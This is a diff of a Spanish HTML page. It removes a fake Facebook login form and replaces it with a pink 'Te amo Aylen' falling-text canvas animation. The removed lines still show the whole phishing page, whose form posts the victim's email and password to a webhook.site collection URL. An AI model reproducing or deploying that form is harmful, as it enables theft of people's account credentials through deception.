@@ -1,52 +1,85 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <title>Inicio de sesión</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Te amo Aylen ❤️</title>
   <style>
     body {
-      background-color: #f0f2f5;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      margin-top: 50px;
+      margin: 0;
+      background: black;
+      overflow: hidden;
+      font-family: 'Courier New', Courier, monospace;
     }
-    .form-container {
-      background-color: white;
-      padding: 20px;
-      display: inline-block;
-      border-radius: 10px;
-      box-shadow: 0px 0px 10px #aaa;
-    }
-    input {
+
+    canvas {
       display: block;
-      width: 250px;
-      margin: 10px auto;
-      padding: 10px;
-      border-radius: 5px;
-      border: 1px solid #ccc;
     }
-    button {
-      background-color: #1877f2;
-      color: white;
-      padding: 10px 25px;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
+
+    #mensaje {
+      position: absolute;
+      top: 40%;
+      width: 100%;
+      text-align: center;
+      color: hotpink;
+      font-size: 50px;
+      font-weight: bold;
+      text-shadow: 0 0 15px hotpink;
     }
-    small {
-      color: gray;
+
+    #nombre {
+      position: absolute;
+      top: 55%;
+      width: 100%;
+      text-align: center;
+      color: pink;
+      font-size: 30px;
+      font-weight: bold;
+      text-shadow: 0 0 10px pink;
     }
   </style>
 </head>
 <body>
-  <div class="form-container">
-    <h2>Inicia sesión en Facebook</h2>
-    <form action="https://webhook.site/5fbb62cf-4342-4867-b913-81951f618be8" method="POST">
-      <input type="email" name="correo" placeholder="Correo electrónico o número" required>
-      <input type="password" name="clave" placeholder="Contraseña" required>
-      <button type="submit">Iniciar sesión</button>
-    </form>
-    <small>¿Olvidaste tu contraseña?</small>
-  </div>
+  <canvas id="canvas"></canvas>
+  <div id="mensaje">Te amo</div>
+  <div id="nombre">Aylen ❤️</div>
+
+  <script>
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    canvas.height = window.innerHeight;
+    canvas.width = window.innerWidth;
+
+    const letters = Array(256).join(" Te amo ").split("");
+    let drops = [];
+
+    for (let i = 0; i < canvas.width / 10; i++) {
+      drops[i] = 1;
+    }
+
+    function draw() {
+      ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = "#ff69b4";
+      ctx.font = "15px monospace";
+
+      for (let i = 0; i < drops.length; i++) {
+        const text = letters[Math.floor(Math.random() * letters.length)];
+        ctx.fillText(text, i * 10, drops[i] * 20);
+        if (drops[i] * 20 > canvas.height && Math.random() > 0.975) {
+          drops[i] = 0;
+        }
+        drops[i]++;
+      }
+    }
+
+    setInterval(draw, 50);
+
+    window.addEventListener("resize", () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+  </script>
 </body>
 </html>
